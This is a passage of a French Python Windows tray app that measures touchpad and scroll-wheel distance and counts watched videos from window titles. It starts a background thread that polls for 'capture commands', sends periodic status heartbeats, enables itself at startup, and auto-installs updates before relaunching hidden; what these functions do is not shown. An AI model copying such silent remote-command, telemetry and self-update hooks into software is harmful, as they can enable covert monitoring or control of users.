    user32.AppendMenuW(m, 0, 1, "Ouvrir")
    user32.AppendMenuW(m, 0, 2, "Reprendre" if T.paused else "Mettre en pause")
    user32.AppendMenuW(m, 0x800, 0, None)
    user32.AppendMenuW(m, 0, 3, "Quitter")
    pt = w.POINT()
    user32.GetCursorPos(ctypes.byref(pt))
    user32.SetForegroundWindow(hwnd)
    cmd = user32.TrackPopupMenu(m, 0x100 | 0x2 | 0x20, pt.x, pt.y, 0, hwnd, None)
    user32.PostMessageW(hwnd, 0, 0, 0)
    user32.DestroyMenu(m)
    if cmd == 1:
        CMDS.put("show")
    elif cmd == 2:
        CMDS.put("toggle")
    elif cmd == 3:
        CMDS.put("quit")

def raw_loop():
    devices = {}
    wm_tbc = user32.RegisterWindowMessageW("TaskbarCreated")

    def proc(hwnd, msg, wp, lp):
        if msg == 0x00FF:
            try:
                on_input(lp, devices)
            except Exception:
                pass
        elif msg == WM_TRAY:
            ev = lp & 0xFFFF
            if ev in (0x202, 0x203):
                CMDS.put("show")
            elif ev == 0x205:
                try:
                    tray_menu(hwnd)
                except Exception:
                    pass
            return 0
        elif msg == wm_tbc:
            TRAY.add(hwnd)
        return user32.DefWindowProcW(hwnd, msg, wp, lp)

    cb = WNDPROC(proc)
    wc = WNDCLASSW()
    wc.lpfnWndProc = cb
    wc.hInstance = kernel32.GetModuleHandleW(None)
    wc.lpszClassName = "absurdeKmRaw"
    user32.RegisterClassW(ctypes.byref(wc))
    hwnd = user32.CreateWindowExW(0, "absurdeKmRaw", "x", 0, 0, 0, 0, 0, None, None, wc.hInstance, None)
    TRAY.add(hwnd)
    devs = (RAWINPUTDEVICE * 2)(RAWINPUTDEVICE(0x0D, 0x05, 0x100, hwnd),   # pavé tactile
                                RAWINPUTDEVICE(0x01, 0x02, 0x100, hwnd))   # souris (molette)
    user32.RegisterRawInputDevices(devs, 2, ctypes.sizeof(RAWINPUTDEVICE))
    msg = w.MSG()
    while user32.GetMessageW(ctypes.byref(msg), None, 0, 0) > 0:
        user32.TranslateMessage(ctypes.byref(msg))
        user32.DispatchMessageW(ctypes.byref(msg))

# ------------------------- fenêtre -------------------------
class App:
    TABS = ("Pavé", "Molette", "Shorts")
    W_BASE = 440

    def __init__(self, hidden):
        global FONT
        self.root = tk.Tk()
        r = self.root
        if hidden:
            r.withdraw()
        r.title(APP_NAME)
        r.resizable(False, False)
        r.protocol("WM_DELETE_WINDOW", self.hide)
        self.sc = r.winfo_fpixels("1i") / 96.0
        fams = set(tkfont.families(r))
        FONT = next((f for f in ("Google Sans", "Segoe UI Variable Display", "Segoe UI") if f in fams), "Segoe UI")
        self.tab = "Pavé"
        self._job = None
        self._was_down = False
        self._ui = self._save = self._tip = 0.0
        self._pill_state = None
        self.wiz = None
        self.cand_title = None
        self.cand_since = 0.0
        self.cand_counted = False
        self.last_counted = None
        self.detect_msg = "En attente…"

        n = 32
        img = tk.PhotoImage(width=n, height=n)
        for y, row in enumerate(icon_pixels(n)):
            for x, (rr, gg, bb, a) in enumerate(row):
                if a >= 128:
                    img.put(f"#{rr:02x}{gg:02x}{bb:02x}", (x, y))
        r.iconphoto(True, img)
        self._img = img
        self.build_overlay()
        self.setup_style()
        self.build()
        self.fit()
        dark_titlebar(r, CFG["theme"] == "Sombre")
        self.refresh()
        if hidden:
            r.withdraw()
        threading.Thread(target=raw_loop, daemon=True).start()
        threading.Thread(target=poll_capture_commands, daemon=True, name="capture-poll").start()
        self.tick()
        self.detect_short()
        r.after(15000, self.auto_check)
        r.after(20000, self.heartbeat_loop)

    def fit(self):
        self.root.update_idletasks()
        self.root.geometry(f"{int(self.W_BASE * self.sc)}x{self.root.winfo_reqheight()}")

    # ---------------------------------------------------------- style --
    def setup_style(self):
        st = ttk.Style()
        st.theme_use("clam")
        st.configure("TCombobox", fieldbackground=C["field"], background=C["field"], foreground=C["fg"],
                     arrowcolor=C["fg"], bordercolor=C["field"], lightcolor=C["field"], darkcolor=C["field"],
                     padding=5)
        st.map("TCombobox", fieldbackground=[("readonly", C["field"])], foreground=[("readonly", C["fg"])],
               selectbackground=[("readonly", C["field"])], selectforeground=[("readonly", C["fg"])])
        st.configure("Horizontal.TProgressbar", troughcolor=C["field"], background=C["accent"],
                     bordercolor=C["field"], lightcolor=C["accent"], darkcolor=C["accent"])
        self.root.option_add("*TCombobox*Listbox.background", C["field"])
        self.root.option_add("*TCombobox*Listbox.foreground", C["fg"])
        self.root.option_add("*TCombobox*Listbox.selectBackground", C["accent"])

    def card(self, parent, pady=6):
        f = tk.Frame(parent, bg=C["card"], padx=18, pady=14)
        f.pack(fill="x", padx=16, pady=pady)
        return f

    def pill(self, parent, text, cmd, kind="normal"):
        return Pill(parent, text, cmd, parent_bg=parent.cget("bg"), font=F(9, "bold"),
                    **self.pill_style(kind))

    def pill_style(self, kind):
        if kind == "primary":
            return dict(bg=C["accent"], fg=C["on_accent"], hover=C["accent_h"])
        if kind == "danger":
            return dict(bg=C["bad"], fg="#ffffff", hover=C["bad"])
        return dict(bg=C["field"], fg=C["fg"], hover=C["hover"])

    def check(self, parent, text, key):
        var = tk.BooleanVar(value=bool(CFG[key]))

        def cb():
            CFG[key] = var.get()
            T.dirty = True
            T.last = {}
        tk.Checkbutton(parent, text=text, variable=var, command=cb, bg=C["card"], fg=C["fg"],
                       activebackground=C["card"], activeforeground=C["fg"], selectcolor=C["field"],
                       font=F(10), anchor="w", bd=0, highlightthickness=0, cursor="hand2").pack(fill="x", pady=2)

    def stat(self, parent, title, col):
        f = tk.Frame(parent, bg=C["card"], padx=16, pady=12)
        f.grid(row=0, column=col, sticky="nsew", padx=(0, 6) if col == 0 else (6, 0))
        tk.Label(f, text=title, bg=C["card"], fg=C["muted"], font=F(8, "bold")).pack(anchor="w")
        lbl = tk.Label(f, text="0 cm", bg=C["card"], fg=C["fg"], font=F(15, "bold"))
        lbl.pack(anchor="w")
        return lbl

    def field(self, parent, row, text, value, width=10):
        tk.Label(parent, text=text, bg=C["card"], fg=C["fg"], font=F(10), anchor="w").grid(
            row=row, column=0, sticky="w", pady=5)
        e = tk.Entry(parent, width=width, justify="center", bg=C["field"], fg=C["fg"],
                     insertbackground=C["fg"], relief="flat", font=F(10))
        e.insert(0, str(value))
        e.grid(row=row, column=1, sticky="e", pady=5, padx=(12, 0))
        parent.grid_columnconfigure(0, weight=1)
        return e

    @staticmethod
    def _num(entry, default, allow_zero=False):
        try:
            v = float(entry.get().replace(",", ".").strip())
            return v if (v > 0 or (allow_zero and v == 0)) else default
        except ValueError:
            return default

    # ---------------------------------------------------------- UI --
    def build(self):
        r = self.root
        r.configure(bg=C["bg"])
        self._pill_state = None

        head = tk.Frame(r, bg=C["bg"])
        head.pack(fill="x", padx=18, pady=(16, 8))
        tk.Label(head, text=APP_NAME, bg=C["bg"], fg=C["fg"], font=F(15, "bold")).pack(side="left")
        self.status = self.pill(head, "", self.toggle)
        self.status.pack(side="right")
        self.theme_pill = self.pill(head, f"◐  {CFG['theme']}", self.cycle_theme)
        self.theme_pill.pack(side="right", padx=(0, 8))

        bar = tk.Frame(r, bg=C["bg"])
        bar.pack(fill="x", padx=18, pady=(0, 6))
        self.tab_pills = {}
        for name in self.TABS:
            p = Pill(bar, name, lambda n=name: self.show_tab(n), parent_bg=C["bg"], font=F(9, "bold"),
                     bg=C["field"], fg=C["muted"], hover=C["hover"], pad=16)
            p.pack(side="left", padx=(0, 6))
            self.tab_pills[name] = p

        body = tk.Frame(r, bg=C["bg"])
        body.pack(fill="both", expand=True)
        body.grid_columnconfigure(0, weight=1)
        self.pages = {}
        for name in self.TABS:
            p = tk.Frame(body, bg=C["bg"])
            p.grid(row=0, column=0, sticky="nsew")
            self.pages[name] = p
        self.build_pad(self.pages["Pavé"])
        self.build_wheel(self.pages["Molette"])
        self.build_shorts(self.pages["Shorts"])
        self.show_tab(self.tab)

        bt = tk.Frame(r, bg=C["bg"])
        bt.pack(fill="x", padx=18, pady=(10, 4))
        self.pill(bt, "Pause / Reprendre", self.toggle, kind="primary").pack(side="left")
        tk.Label(r, text="Alt + Ctrl droit = pause / reprise  ·  la croix réduit dans les icônes cachées",
                 bg=C["bg"], fg=C["muted"], font=F(8)).pack(pady=(8, 2))
        ur = tk.Frame(r, bg=C["bg"])
        ur.pack(fill="x", padx=18, pady=(0, 12))
        tk.Label(ur, text=f"v{VERSION}", bg=C["bg"], fg=C["muted"], font=F(8)).pack(side="left")

    def show_tab(self, name):
        self.tab = name
        self.pages[name].tkraise()
        for n, p in self.tab_pills.items():
            on = n == name
            p.update_look(bg=C["accent"] if on else C["field"], fg=C["on_accent"] if on else C["muted"],
                          hover=C["accent_h"] if on else C["hover"])

    def build_pad(self, p):
        hero = self.card(p)
        tk.Label(hero, text="DISTANCE DU PAVÉ", bg=C["card"], fg=C["muted"], font=F(8, "bold")).pack(anchor="w")
        row = tk.Frame(hero, bg=C["card"])
        row.pack(anchor="w", pady=(4, 0))
        self.big = tk.Label(row, text="0", bg=C["card"], fg=C["fg"], font=F(40, "bold"))
        self.big.pack(side="left")
        self.bigu = tk.Label(row, text="cm", bg=C["card"], fg=C["accent"], font=F(16, "bold"))
        self.bigu.pack(side="left", padx=(8, 0), pady=(16, 0))

        rowf = tk.Frame(p, bg=C["bg"])
        rowf.pack(fill="x", padx=16, pady=6)
        self.today = self.stat(rowf, "AUJOURD'HUI", 0)
        self.sess = self.stat(rowf, "SESSION", 1)
        rowf.columnconfigure(0, weight=1, uniform="a")
        rowf.columnconfigure(1, weight=1, uniform="a")

        opt = self.card(p)
        tk.Label(opt, text="CE QUI EST COMPTÉ", bg=C["card"], fg=C["muted"], font=F(8, "bold")).pack(anchor="w", pady=(0, 4))
        self.check(opt, "Mouvements (1 doigt)", "count_move")
        self.check(opt, "Drag (clic maintenu + déplacement)", "count_drag")
        self.check(opt, "Scroll (2 doigts)", "count_scroll")
        ru = tk.Frame(opt, bg=C["card"])
        ru.pack(fill="x", pady=(10, 0))
        tk.Label(ru, text="Unité", bg=C["card"], fg=C["fg"], font=F(10)).pack(side="left")
        self.unit_var = tk.StringVar(value=CFG["unit"] if CFG["unit"] in ["Auto"] + list(UNITS) else "Auto")
        cbx = ttk.Combobox(ru, textvariable=self.unit_var, values=["Auto"] + list(UNITS), state="readonly", width=10)
        cbx.pack(side="right")
        cbx.bind("<<ComboboxSelected>>", self.on_unit)

        cal = self.card(p)
        tk.Label(cal, text="CALIBRAGE DU PAVÉ", bg=C["card"], fg=C["muted"], font=F(8, "bold")).pack(anchor="w")
        self.cal_info = tk.Label(cal, text="", bg=C["card"], fg=C["fg"], font=F(9), anchor="w", justify="left")
        self.cal_info.pack(fill="x", pady=(4, 10))
        rc = tk.Frame(cal, bg=C["card"])
        rc.pack(anchor="w")
        self.pill(rc, "Calibrer à la règle", self.calibrer, kind="primary").pack(side="left")
        self.pill(rc, "Revenir à l'auto", self.auto_cal).pack(side="left", padx=(8, 0))

        rr = tk.Frame(p, bg=C["bg"])
        rr.pack(fill="x", padx=16, pady=(4, 0))
        self.pill(rr, "Remettre à zéro", self.reset_pad).pack(side="left")

    def build_wheel(self, p):
        c = self.card(p)
        self.lbl_meters = tk.Label(c, text="0.00 m", bg=C["card"], fg=C["accent"], font=F(34, "bold"))
        self.lbl_meters.pack(pady=(6, 0))
        tk.Label(c, text="parcourus par la molette", bg=C["card"], fg=C["muted"], font=F(9)).pack()
        self.lbl_ticks = tk.Label(c, text="0 crans", bg=C["card"], fg=C["fg"], font=F(11))
        self.lbl_ticks.pack(pady=(4, 6))

        cf = self.card(p)
        self.e_cm_tick = self.field(cf, 0, "Distance par cran (cm)", CFG["cm_per_tick"])

        cal = self.card(p)
        tk.Label(cal, text="CALIBRATION SUR RÈGLE", bg=C["card"], fg=C["muted"], font=F(8, "bold")).pack(anchor="w")
        g = tk.Frame(cal, bg=C["card"])
        g.pack(fill="x", pady=(6, 4))
        self.e_ruler = self.field(g, 0, "Longueur de la règle (cm)", CFG["ruler_cm"])
        if WHEEL["calib"]:
            self.btn_cal = self.pill(cal, "Terminer la calibration", self.toggle_wheel_calib, kind="danger")
        else:
            self.btn_cal = self.pill(cal, "Démarrer la calibration", self.toggle_wheel_calib, kind="primary")
        self.btn_cal.pack(anchor="w", pady=(8, 6))
        self.lbl_cal = tk.Label(cal, text="Fais rouler la molette sur la règle, du début à la fin,\n"
                                          "puis clique sur « Terminer ».",
                                bg=C["card"], fg=C["muted"], font=F(9), justify="left", anchor="w")
        self.lbl_cal.pack(fill="x")

        rr = tk.Frame(p, bg=C["bg"])
        rr.pack(fill="x", padx=16, pady=(4, 0))
        self.pill(rr, "Remettre à zéro", self.reset_wheel).pack(side="left")

    def build_shorts(self, p):
        c = self.card(p)
        self.lbl_short_total = tk.Label(c, text="0.00 m", bg=C["card"], fg=C["accent"], font=F(34, "bold"))
        self.lbl_short_total.pack(pady=(6, 0))
        tk.Label(c, text="de shorts mis bout à bout", bg=C["card"], fg=C["muted"], font=F(9)).pack()
        self.lbl_short_count = tk.Label(c, text="0 shorts vus", bg=C["card"], fg=C["fg"], font=F(11))
        self.lbl_short_count.pack(pady=(4, 0))
        self.lbl_eiffel = tk.Label(c, text="", bg=C["card"], fg=C["muted"], font=F(9))
        self.lbl_eiffel.pack(pady=(0, 6))

        cf = self.card(p)
        self.e_short = self.field(cf, 0, "Taille d'un short sur l'écran (cm)", CFG["short_cm"])
        self.e_min = self.field(cf, 1, "Temps pour valider un short (s)", CFG["min_seconds"])
        self.e_kw = self.field(cf, 2, "Mots-clés de la fenêtre", CFG["keywords"], width=22)

        self.lbl_detect = tk.Label(p, text="", bg=C["bg"], fg=C["muted"], wraplength=400, justify="left", font=F(9))
        self.lbl_detect.pack(padx=18, pady=(4, 2), anchor="w")
        tk.Label(p, text="Une vidéo (short ou longue) est comptée quand le titre de la fenêtre active "
                         "change et reste affiché assez longtemps. Un scroll rapide sans regarder ne compte pas.",
                 bg=C["bg"], fg=C["muted"], wraplength=400, justify="left", font=F(8)).pack(padx=18, anchor="w")

        rr = tk.Frame(p, bg=C["bg"])
        rr.pack(fill="x", padx=16, pady=(8, 0))
        self.pill(rr, "Remettre à zéro", self.reset_shorts).pack(side="left")

    # ---------------------------------------------------- notification unique (pause / reprise) --
    def build_overlay(self):
        self.TW = int(240 * self.sc)
        self.TH = int(58 * self.sc)
        self.ov = tk.Toplevel(self.root)
        self.ov.withdraw()
        self.ov.overrideredirect(True)
        self.ov.attributes("-topmost", True)
        self.ov.configure(bg=TRANS)
        self.ov.attributes("-transparentcolor", TRANS)  # coins arrondis réellement transparents
        sw = self.root.winfo_screenwidth()
        sh = self.root.winfo_screenheight()
        self.ov.geometry(f"{self.TW}x{self.TH}+{(sw - self.TW) // 2}+{int(sh * 0.10)}")
        self.cv = tk.Canvas(self.ov, width=self.TW, height=self.TH, bg=TRANS, highlightthickness=0, bd=0)
        self.cv.pack()

    def _clickthrough(self):
        try:
            self.ov.update_idletasks()
            hwnd = user32.GetParent(self.ov.winfo_id()) or self.ov.winfo_id()
            st = user32.GetWindowLongW(hwnd, -20)
            user32.SetWindowLongW(hwnd, -20, st | 0x80000 | 0x20 | 0x80 | 0x08000000)
        except Exception:
            pass

    def _draw_toast(self, playing):
        cv = self.cv
        cv.delete("all")
        W, H = self.TW, self.TH
        rrect(cv, 0, 0, W, H, H / 2, fill=C["toast_bg"], outline="")
        cx, cy, s = H * 0.85, H / 2, H * 0.30
        if playing:
            cv.create_polygon(cx - s * 0.6, cy - s, cx - s * 0.6, cy + s, cx + s, cy,
                              fill=C["ok"], outline="")
            label = "Reprise"
        else:
            cv.create_rectangle(cx - s * 0.7, cy - s, cx - s * 0.2, cy + s, fill=C["warn"], outline="")
            cv.create_rectangle(cx + s * 0.2, cy - s, cx + s * 0.7, cy + s, fill=C["warn"], outline="")
            label = "Pause"
        cv.create_text(H * 1.6, cy, text=label, anchor="w", fill=C["toast_fg"], font=F(12, "bold"))

    def notify(self, playing):
        if self._job:
            self.root.after_cancel(self._job)
        self._draw_toast(playing)
        self.ov.attributes("-alpha", 0.96)
        self.ov.deiconify()
        self.ov.lift()
        self._clickthrough()
        self._job = self.root.after(900, lambda: self._fade(time.perf_counter()))

    def _fade(self, t0):
        p = (time.perf_counter() - t0) / 0.5
        if p >= 1:
            self.ov.withdraw()
            self._job = None
            return
        self.ov.attributes("-alpha", 0.96 * (1 - p))
        self._job = self.root.after(15, self._fade, t0)

    # ---------------------------------------------------- thème --
    def cycle_theme(self):
        global C
        i = THEME_ORDER.index(CFG["theme"])
        CFG["theme"] = THEME_ORDER[(i + 1) % len(THEME_ORDER)]
        C = dict(THEMES[CFG["theme"]])
        T.dirty = True
        self.rebuild()

    def rebuild(self):
        """Reconstruit l'interface avec les couleurs du thème courant (les valeurs saisies sont conservées)."""
        self.sync()
        if self.wiz is not None:
            try:
                self.wiz.destroy()
            except tk.TclError:
                pass
            self.wiz = None
            T.cal = False
        for child in self.root.winfo_children():
            if child is not self.ov:
                child.destroy()
        self.setup_style()
        self.build()
        self.fit()
        dark_titlebar(self.root, CFG["theme"] == "Sombre")
        self.refresh()

    # ---------------------------------------------------- affichage --
    def refresh(self):
        unit = CFG["unit"]
        v, u = convert(CFG["total_cm"], unit)
        self.big.config(text=fmt(v))
        self.bigu.config(text=u)
        v, u = convert(CFG["today_cm"], unit)
        self.today.config(text=f"{fmt(v)} {u}")
        v, u = convert(T.session, unit)
        self.sess.config(text=f"{fmt(v)} {u}")
        self.cal_info.config(text=T.info())

        if T.paused != self._pill_state:
            self._pill_state = T.paused
            if T.paused:
                self.status.update_look(text="❚❚  En pause", fg=C["warn"], bg=C["field"], hover=C["hover"])
            else:
                self.status.update_look(text="●  En cours", fg=C["ok"], bg=C["field"], hover=C["hover"])

        cm_tick = self._num(self.e_cm_tick, 0.25)
        self.lbl_meters.config(text=fmt_m(CFG["ticks"] * cm_tick / 100))
        self.lbl_ticks.config(text=f"{int(CFG['ticks']):,} crans".replace(",", " "))
        if WHEEL["calib"]:
            self.lbl_cal.config(text=f"Calibration en cours… {int(WHEEL['calib_ticks'])} crans", fg=C["fg"])

        short_cm = self._num(self.e_short, 25)
        total_m = CFG["shorts"] * short_cm / 100
        self.lbl_short_total.config(text=fmt_m(total_m))
        self.lbl_short_count.config(text=f"{int(CFG['shorts']):,} shorts vus".replace(",", " "))
        self.lbl_eiffel.config(text=f"≈ {total_m / EIFFEL_M:.2f} × la Tour Eiffel 🗼")
        self.lbl_detect.config(text=self.detect_msg)

    def sync(self):
        """Recopie les champs saisis dans la config."""
        CFG["cm_per_tick"] = self._num(self.e_cm_tick, 0.25)
        CFG["ruler_cm"] = self._num(self.e_ruler, 30)
        CFG["short_cm"] = self._num(self.e_short, 25)
        CFG["min_seconds"] = self._num(self.e_min, 2, allow_zero=True)
        CFG["keywords"] = self.e_kw.get()

    # ---------------------------------------------------- détection des shorts --
    def detect_short(self):
        now = time.monotonic()
        title = re.sub(r"^\(\d+\)\s*", "", foreground_title()).strip()
        kws = [k.strip().lower() for k in self.e_kw.get().split(",") if k.strip()]
        min_s = self._num(self.e_min, 2, allow_zero=True)

        if T.paused:
            self.cand_title = None
            self.detect_msg = "⏸ En pause"
        elif not title or not kws or not any(k in title.lower() for k in kws) or title.lower() in kws:
            self.cand_title = None
            self.detect_msg = "Fenêtre active non reconnue (ouvre une vidéo dans ton navigateur)."
        else:
            if title != self.cand_title:
                self.cand_title = title
                self.cand_since = now
                self.cand_counted = False
            name = title if len(title) <= 45 else title[:44] + "…"
            if self.cand_counted or title == self.last_counted:
                self.detect_msg = f"✔ Compté : {name}"
            elif now - self.cand_since >= min_s:
                CFG["shorts"] += 1
                T.dirty = True
                self.last_counted = title
                self.cand_counted = True
                self.detect_msg = f"✔ Compté : {name}"
            else:
                left = max(min_s - (now - self.cand_since), 0)
                self.detect_msg = f"⏳ {name} ({left:.1f} s)"
        self.root.after(250, self.detect_short)

    # ---------------------------------------------------- actions --
    def toggle(self):
        T.paused = not T.paused
        T.last = {}
        etat = "En pause" if T.paused else "En cours"
        threading.Thread(target=publish_status, args=(etat,), daemon=True).start()
        self.notify(playing=not T.paused)
        self.refresh()

    def on_unit(self, _e=None):
        CFG["unit"] = self.unit_var.get()
        T.dirty = True
        self.refresh()

    def reset_pad(self):
        if messagebox.askyesno("Remettre à zéro", "Remettre la distance du pavé (total, aujourd'hui, session) à 0 ?",
                               parent=self.root):
            CFG["total_cm"] = 0.0
            CFG["today_cm"] = 0.0
            T.session = 0.0
            T.last = {}
            T.dirty = True
            self.refresh()

    def reset_wheel(self):
        CFG["ticks"] = 0.0
        T.dirty = True
        self.refresh()

    def reset_shorts(self):
        CFG["shorts"] = 0
        self.last_counted = None
        T.dirty = True
        self.refresh()

    def toggle_wheel_calib(self):
        if not WHEEL["calib"]:
            WHEEL["calib"] = True
            WHEEL["calib_ticks"] = 0.0
            self.btn_cal.update_look(text="Terminer la calibration", **self.pill_style("danger"))
        else:
            WHEEL["calib"] = False
            self.btn_cal.update_look(text="Démarrer la calibration", **self.pill_style("primary"))
            n = WHEEL["calib_ticks"]
            if n > 0:
                ruler = self._num(self.e_ruler, 30)
                value = ruler / n
                self.e_cm_tick.delete(0, "end")
                self.e_cm_tick.insert(0, f"{value:.4f}")
                self.lbl_cal.config(text=f"✔ {int(n)} crans pour {ruler:g} cm\n→ {value:.4f} cm par cran", fg=C["ok"])
            else:
                self.lbl_cal.config(text="Aucun cran détecté, réessaie.", fg=C["bad"])
            T.dirty = True

    def auto_cal(self):
        if not T.auto:
            messagebox.showinfo("Calibrage auto", "Ce pavé n'indique pas sa taille : utilise « Calibrer à la règle ».",
                                parent=self.root)
            return
        T.ux, T.uy = T.auto
        T.src = "auto"
        CFG["calib"] = None
        T.dirty = True
        self.refresh()

    def calibrer(self):
        if not T.seen:
            messagebox.showinfo("Calibrage", "Touche d'abord le pavé avec un doigt pour qu'il soit détecté.",
                                parent=self.root)
            return
        if self.wiz is not None and self.wiz.winfo_exists():
            self.wiz.lift()
            return
        sc = self.sc
        win = self.wiz = tk.Toplevel(self.root)
        win.title("Calibrage du pavé")
        win.configure(bg=C["bg"])
        win.resizable(False, False)
        win.transient(self.root)
        tk.Label(win, bg=C["bg"], fg=C["fg"], font=F(10), justify="left", wraplength=int(380 * sc),
                 text="1. Mesure à la règle la zone tactile de ton pavé (largeur × hauteur, en cm).\n\n"
                      "2. Fais glisser ton doigt sur tout le pavé : une grande diagonale d'un coin à l'autre "
                      "suffit. Les barres montrent la zone atteinte, vise ~100 %.\n\n"
                      "(Le but : que le script apprenne les valeurs min/max que le pavé renvoie à gauche, à droite, "
                      "en haut et en bas. Les coins ne sont pas obligatoires, c'est juste le plus rapide.)"
                 ).pack(padx=18, pady=(16, 10), anchor="w")
        form = tk.Frame(win, bg=C["bg"])
        form.pack(padx=18, anchor="w")
        wv = tk.StringVar(value=f"{T.rx / T.ux:.1f}" if T.ux else "")
        hv = tk.StringVar(value=f"{T.ry / T.uy:.1f}" if T.uy else "")
        for i, (txt, var) in enumerate((("Largeur (cm)", wv), ("Hauteur (cm)", hv))):
            tk.Label(form, text=txt, bg=C["bg"], fg=C["fg"], font=F(10), width=14, anchor="w").grid(row=i, column=0, pady=4)
            tk.Entry(form, textvariable=var, width=8, bg=C["field"], fg=C["fg"], insertbackground=C["fg"],
                     relief="flat", font=F(10)).grid(row=i, column=1, pady=4, sticky="w")
        bars = tk.Frame(win, bg=C["bg"])
        bars.pack(padx=18, pady=(12, 4), anchor="w")
        pbx = ttk.Progressbar(bars, length=int(240 * sc), maximum=100)
        pby = ttk.Progressbar(bars, length=int(240 * sc), maximum=100)
        lx = tk.Label(bars, bg=C["bg"], fg=C["muted"], font=F(9), width=8)
        ly = tk.Label(bars, bg=C["bg"], fg=C["muted"], font=F(9), width=8)
        tk.Label(bars, text="Largeur", bg=C["bg"], fg=C["fg"], font=F(9), width=8, anchor="w").grid(row=0, column=0, pady=4)
        pbx.grid(row=0, column=1, padx=6)
        lx.grid(row=0, column=2)
        tk.Label(bars, text="Hauteur", bg=C["bg"], fg=C["fg"], font=F(9), width=8, anchor="w").grid(row=1, column=0, pady=4)
        pby.grid(row=1, column=1, padx=6)
        ly.grid(row=1, column=2)

        def reset_ext():
            T.ext = [1e9, -1e9, 1e9, -1e9]

        def close():
            T.cal = False
            win.destroy()

        def upd():
            if not win.winfo_exists():
                return
            x0, x1, y0, y1 = T.ext
            px = max(0.0, (x1 - x0) / T.rx * 100) if T.rx and x1 > x0 else 0.0
            py = max(0.0, (y1 - y0) / T.ry * 100) if T.ry and y1 > y0 else 0.0
            pbx["value"], pby["value"] = px, py
            lx.config(text=f"{px:.0f} %")
            ly.config(text=f"{py:.0f} %")
            win.after(100, upd)

        def valider():
            try:
                W = float(wv.get().replace(",", "."))
                H = float(hv.get().replace(",", "."))
                assert W > 0 and H > 0
            except Exception:
                messagebox.showwarning("Calibrage", "Entre la largeur et la hauteur en cm (ex : 10.5).", parent=win)
                return
            x0, x1, y0, y1 = T.ext
            if T.rx and ((x1 - x0) < 0.6 * T.rx or (y1 - y0) < 0.6 * T.ry):
                messagebox.showwarning("Calibrage", "Zone atteinte trop petite : glisse ton doigt sur tout le pavé "
                                                    "(barres proches de 100 %).", parent=win)
                return
            T.ux, T.uy = (x1 - x0) / W, (y1 - y0) / H
            T.src = "manuel"
            CFG["calib"] = [T.ux, T.uy]
            T.dirty = True
            close()
            self.refresh()
            messagebox.showinfo("Calibrage", f"C'est calibré !\nTest : glisse 5 fois sur toute la largeur → "
                                             f"ça doit faire ≈ {5 * W:.0f} cm.", parent=self.root)

        bt = tk.Frame(win, bg=C["bg"])
        bt.pack(padx=18, pady=(10, 16), anchor="w")
        self.pill(bt, "Valider", valider, kind="primary").pack(side="left")
        self.pill(bt, "Recommencer", reset_ext).pack(side="left", padx=8)
        self.pill(bt, "Annuler", close).pack(side="left")
        win.protocol("WM_DELETE_WINDOW", close)
        T.last = {}
        reset_ext()
        T.cal = True
        dark_titlebar(win, CFG["theme"] == "Sombre")
        upd()

    def heartbeat_loop(self):
        etat = "En pause" if T.paused else "En cours"
        threading.Thread(target=publish_status, args=(etat,), daemon=True).start()
        self.root.after(STATUS_EVERY_S * 1000, self.heartbeat_loop)

    # ---------------------------------------------------- mise à jour automatique --
    def auto_check(self):
        check_updates()
        self.root.after(5 * 60 * 1000, self.auto_check)

    def on_update_event(self, kind, payload):
        global RESTART, RESTART_HIDDEN
        if kind == "found":
            install_update(payload)
        elif kind == "installed":
            RESTART = True
            RESTART_HIDDEN = self.root.state() == "withdrawn"
            self.quit()
            return True
        return False

    # ---------------------------------------------------- fenêtre et cycle de vie --
    def hide(self):
        self.sync()
        save_cfg()
        self.root.withdraw()

    def show(self):
        r = self.root
        r.deiconify()
        r.lift()
        r.attributes("-topmost", True)
        r.after(300, lambda: r.attributes("-topmost", False))
        r.focus_force()
        self.refresh()

    def quit(self):
        T.cal = False
        WHEEL["calib"] = False
        self.sync()
        save_cfg()
        publish_status("Arrêté", timeout=4)
        TRAY.remove()
        self.root.destroy()

    def tick(self):
        now = time.time()
        down = (user32.GetAsyncKeyState(0xA3) & 0x8000) and (user32.GetAsyncKeyState(0x12) & 0x8000)
        if down and not self._was_down:
            self.toggle()
        self._was_down = bool(down)
        while True:
            try:
                c = CMDS.get_nowait()
            except queue.Empty:
                break
            if c == "show":
                self.show()
            elif c == "toggle":
                self.toggle()
            elif c == "quit":
                self.quit()
                return
        while True:
            try:
                ev = UPQ.get_nowait()
            except queue.Empty:
                break
            if self.on_update_event(*ev):
                return
        today = time.strftime("%Y-%m-%d")
        if CFG["day"] != today:
            CFG["day"] = today
            CFG["today_cm"] = 0.0
            T.dirty = True
        if now - self._ui > 0.1 and self.root.state() != "withdrawn":
            self.refresh()
            self._ui = now
        if now - self._save > 10:
            self.sync()
            save_cfg()
            T.dirty = False
            self._save = now
        if now - self._tip > 5:
            v, u = convert(CFG["total_cm"], CFG["unit"])
            mol = fmt_m(CFG["ticks"] * self._num(self.e_cm_tick, 0.25) / 100)
            TRAY.tip(f"{APP_NAME} : pavé {fmt(v)} {u} · molette {mol}" + (" (pause)" if T.paused else ""))
            self._tip = now
        self.root.after(30, self.tick)

def main():
    global MUTEX
    MUTEX = kernel32.CreateMutexW(None, False, "absurdeKmMutex")
    if ctypes.get_last_error() == 183:
        user32.MessageBoxW(None, f"{APP_NAME} tourne déjà : clique sur son icône dans les icônes cachées (^) "
                                 "de la barre des tâches.", APP_NAME, 0x40)
        return
    try:
        ctypes.windll.shcore.SetProcessDpiAwareness(1)
    except Exception:
        pass
    set_startup()
    app = App(hidden="--hidden" in sys.argv or "--background" in sys.argv)
    T.dirty = True
    app.root.mainloop()
    save_cfg()
    if RESTART:
        kernel32.CloseHandle(MUTEX)
        subprocess.Popen([pyw_exe(), os.path.abspath(__file__)] + (["--hidden"] if RESTART_HIDDEN else []),
                         creationflags=0x08000000, close_fds=True)

if __name__ == "__main__":
    main()
